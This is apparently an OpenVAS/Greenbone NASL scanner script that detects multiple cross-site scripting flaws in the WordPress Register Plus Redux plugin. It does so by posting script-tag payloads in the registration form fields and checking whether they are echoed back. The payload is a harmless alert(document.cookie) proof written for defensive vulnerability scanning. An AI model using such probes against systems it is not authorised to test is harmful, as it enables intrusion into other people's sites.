CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802324" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)" );
	script_bugtraq_id( 45179 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "WordPress Register Plus Redux Plugin Multiple Cross-Site Scripting Vulnerabilities" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://websecurity.com.ua/4542/" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/45503/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103773/registerplus373-xss.txt" );
	script_tag( name: "impact", value: "Successful exploitation could allow an attacker to execute
  arbitrary HTML and script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress Register Plus Redux Plugin 3.7.3 and prior." );
	script_tag( name: "insight", value: "The flaws are due to:

  - Improper validation of input passed via the 'user_login', 'user_email',
  'firstname', 'lastname', 'website', 'aim', 'yahoo', 'jabber', 'about',
  'password', and 'invitation_code' parameters to 'wp-login.php' (when
  'action' is set to 'register').

  - A direct request to 'register-plus-redux.php' allows remote attackers to
  obtain installation path in error message." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running WordPress Register Plus Redux Plugin and is
  prone to multiple vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = NASLString( dir + "/wp-login.php?action=register" );
authVariables = "user_login=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C" + "%2Fscript%3E&user_email=%22%3E%3Cscript%3Ealert%28document" + ".cookie%29%3C%2Fscript%3E&first_name=%22%3E%3Cscript%3Eale" + "rt%28document.cookie%29%3C%2Fscript%3E&last_name=%22%3E%3C" + "script%3Ealert%28document.cookie%29%3C%2Fscript%3E&url=&ai" + "m=&yahoo=&jabber=&description=&redirect_to=&wp-submit=Regi" + "ster";
host = http_host_name( port: port );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( authVariables ), "\\r\\n\\r\\n", authVariables );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "><script>alert(document.cookie)</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

